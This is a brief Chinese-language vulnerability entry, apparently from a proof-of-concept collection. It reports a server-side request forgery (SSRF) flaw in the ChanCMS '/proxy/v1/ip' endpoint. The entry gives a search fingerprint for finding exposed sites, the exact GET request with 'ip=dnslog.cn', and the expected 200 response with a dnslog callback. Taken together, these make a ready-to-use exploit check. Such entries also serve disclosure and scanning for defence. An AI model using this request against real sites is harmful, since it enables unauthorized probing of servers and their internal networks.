# ChanCMS系统ip接口存在ssrf漏洞

ChanCMS ｜ SSRF ｜ —
- **指纹**：`body="ChanCMS"`
- **请求**：`GET /proxy/v1/ip?ip=dnslog.cn HTTP/1.1`
- **响应特征**：200 Dnslog回显